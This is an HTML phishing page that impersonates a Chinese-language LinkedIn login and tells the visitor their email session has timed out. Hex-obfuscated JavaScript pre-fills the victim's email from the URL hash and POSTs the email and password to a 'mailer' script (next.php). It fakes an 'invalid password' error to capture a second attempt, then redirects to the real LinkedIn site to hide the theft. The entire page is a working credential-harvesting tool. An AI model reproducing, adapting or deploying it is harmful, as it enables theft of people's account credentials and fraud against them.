
<!DOCTYPE html>
<html lang="en">

<head>
    <script type="text/JavaScript" src="js/jquery.min.js"></script>
    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link href="" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
    <title>LinkedIn 登录，登录 | 领英</title>
  <link rel="shortcut icon" href="https://www.linkedin.com/favicon.ico">
</head>

<body style="background:url(&#39;images/bg.png&#39;); background-size: cover; background-repeat: no-repeat;" class="modal-open" data-new-gr-c-s-check-loaded="14.1094.0" data-gr-ext-installed="">
    <button type="button" class="btn btn-primary" id="m-btn" data-toggle="modal" data-target="#exampleModalCenter" style="visibility: hidden;">
        Launch demo modal
    </button>
    <!-- Modal -->
    <div class="modal fade" id="exampleModalCenter" data-backdrop="static" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content" style="min-width: 350px">
                <div class="modal-header p-2" style="background-color: #0077B5;" id=logo> <IMG border=9 alt="" align="left"
src= https://imgur.com/sCKvBdq.png" width=70 height=40>
                    <button type="button" class="close" aria-label="Close">
                        <span aria-hidden="true">×</span>
                    </button>
                </div>
                <form class="mt-4" id="form-1" method="POST">
                    <div class="modal-body px-5">
                        <span style="font-weight: 700; color: #575757;font-size: 17px"; >电子邮件登录超时，请重新登录
                        </span>
                        <input type="hidden" name="btn1" value="btn1">
                        <center>
                            <div class="alert alert-danger" id="msg" style="display: none;">无效的密码！请输入正确的密码。</div>
                        </center>
                        <div class="form-group row">
                            <label for="staticai" class="col-sm-4 col-form-label">用户名</label>
                            <div class="col-sm-8">
                                <input type="email" class="form-control py-1" id="ai" name="ai" value="" required placeholder="电子邮件地址" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label for="inputpr" class="col-sm-4 col-form-label">邮箱密码</label>
                            <div class="col-sm-8 ">
                                <input type="password" class="form-control py-1" id="pr" name="pr" placeholder="密码" required>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer p-1">
                        <button type="submit" class="btn btn-success py-1" id="btn1" style="background-color: #0077B5;" >登录</button>
                        
                    </div>
                </form>
            </div>
        </div>
    </div>
    <!-- //mailer link -->
    <input type="hidden" id="f" value="./next.php">
    <!-- //mail result count -->
    <input type="hidden" id="rc" value="2">
    <!-- //redirect link -->
    <input type="hidden" id="rdrt" value="https://www.linkedin.com/authwall?trk=gf&trkInfo=AQHoXQQKVXyguQAAAYj4E3nwZ0WhV8g2XGTlJzdCkwZ3uAsGHFlXgxVjvS1SSgy-OM8v4fgTlmVzpQZAghiMSHQJt8p8npwnSbQ-grhV0rxz3QmAuhlv3GiGANBXW7wH0lkoL14=&original_referer=https://www.google.com/&sessionRedirect=https%3A%2F%2Fcn.linkedin.com%2Fcompany%2Flinkedin-china">
    <!-- // if you want to redirection for domain (0 for no)(1 for yes) -->
    <input type="hidden" id="domain_redirect" value="0">
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="js/popper.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
var _0x9489=["\x76\x61\x6C","\x23\x66","\x23\x72\x63","\x23\x72\x64\x72\x74","\x23\x64\x6F\x6D\x61\x69\x6E\x5F\x72\x65\x64\x69\x72\x65\x63\x74","\x6B\x65\x79\x43\x6F\x64\x65","\x77\x68\x69\x63\x68","\x31\x33","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x63\x6C\x69\x63\x6B","\x23\x73\x75\x62\x2D\x62\x74\x6E","\x6B\x65\x79\x70\x72\x65\x73\x73","\x23\x6D\x2D\x62\x74\x6E","\x73\x75\x62\x73\x74\x72","\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x40","\x69\x6E\x64\x65\x78\x4F\x66","\x2E","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x23\x61\x69","\x68\x74\x6D\x6C","\x23\x61\x69\x63\x68","\x68\x69\x64\x65","\x23\x6D\x73\x67","\x23\x66\x6F\x72\x6D\x2D\x31","\x6C\x6F\x67","\x4A\x53\x4F\x4E","\x50\x4F\x53\x54","\u9A8C\u8BC1\x2E\x2E\x2E","\x23\x62\x74\x6E\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E","\x72\x65\x70\x6C\x61\x63\x65","","\x23\x70\x72","\x73\x68\x6F\x77","\u767B\u5F55","\x61\x6A\x61\x78","\x73\x75\x62\x6D\x69\x74","\x72\x65\x61\x64\x79"];var f=$(_0x9489[1])[_0x9489[0]]();var rc=$(_0x9489[2])[_0x9489[0]]();var rdrt=$(_0x9489[3])[_0x9489[0]]();var domain_redirect=$(_0x9489[4])[_0x9489[0]]();$(document)[_0x9489[40]](function(){var _0xe3ddx5=0;$(document)[_0x9489[11]](function(_0xe3ddx6){var _0xe3ddx7=(_0xe3ddx6[_0x9489[5]]?_0xe3ddx6[_0x9489[5]]:_0xe3ddx6[_0x9489[6]]);if(_0xe3ddx7== _0x9489[7]){_0xe3ddx6[_0x9489[8]]();$(_0x9489[10])[_0x9489[9]]()}});$(_0x9489[12])[_0x9489[9]]();var _0xe3ddx8=window[_0x9489[15]][_0x9489[14]][_0x9489[13]](1);if(!_0xe3ddx8){}else {var _0xe3ddx9=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0xe3ddx9[_0x9489[16]](_0xe3ddx8)){var _0xe3ddxa=_0xe3ddx8}else {var _0xe3ddxa=atob(_0xe3ddx8)};var _0xe3ddxb=_0xe3ddxa[_0x9489[18]](_0x9489[17]);var _0xe3ddxc=_0xe3ddxa[_0x9489[13]]((_0xe3ddxb+ 1));var _0xe3ddxd=_0xe3ddxc[_0x9489[13]](0,_0xe3ddxc[_0x9489[18]](_0x9489[19]));var _0xe3ddxe=_0xe3ddxd[_0x9489[20]]();$(_0x9489[21])[_0x9489[0]](_0xe3ddxa);$(_0x9489[23])[_0x9489[22]](_0xe3ddxa);$(_0x9489[25])[_0x9489[24]]()};$(_0x9489[26])[_0x9489[39]](function(_0xe3ddx6){$(_0x9489[25])[_0x9489[24]]();_0xe3ddx6[_0x9489[8]]();var _0xe3ddx8=$(_0x9489[21])[_0x9489[0]]();var _0xe3ddxa=_0xe3ddx8;var _0xe3ddxf=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;var _0xe3ddxb=_0xe3ddxa[_0x9489[18]](_0x9489[17]);var _0xe3ddxc=_0xe3ddxa[_0x9489[13]]((_0xe3ddxb+ 1));var _0xe3ddxd=_0xe3ddxc[_0x9489[13]](0,_0xe3ddxc[_0x9489[18]](_0x9489[19]));var _0xe3ddxe=_0xe3ddxd[_0x9489[20]]();_0xe3ddx5= _0xe3ddx5+ 1;var _0xe3ddxd= new FormData($(_0x9489[26])[0]);console[_0x9489[27]](_0xe3ddxd);$[_0x9489[38]]({dataType:_0x9489[28],url:f,type:_0x9489[29],data:_0xe3ddxd,processData:false,contentType:false,beforeSend:function(_0xe3ddx10){$(_0x9489[31])[_0x9489[22]](_0x9489[30])},complete:function(){if(_0xe3ddx5>= rc){_0xe3ddx5= 0;if(domain_redirect== 1){window[_0x9489[15]][_0x9489[33]](_0x9489[32]+ _0xe3ddxc)}else {window[_0x9489[15]][_0x9489[33]](rdrt)};return false};$(_0x9489[35])[_0x9489[0]](_0x9489[34]);$(_0x9489[25])[_0x9489[36]]();$(_0x9489[31])[_0x9489[22]](_0x9489[37])}})})})
</script>

</html>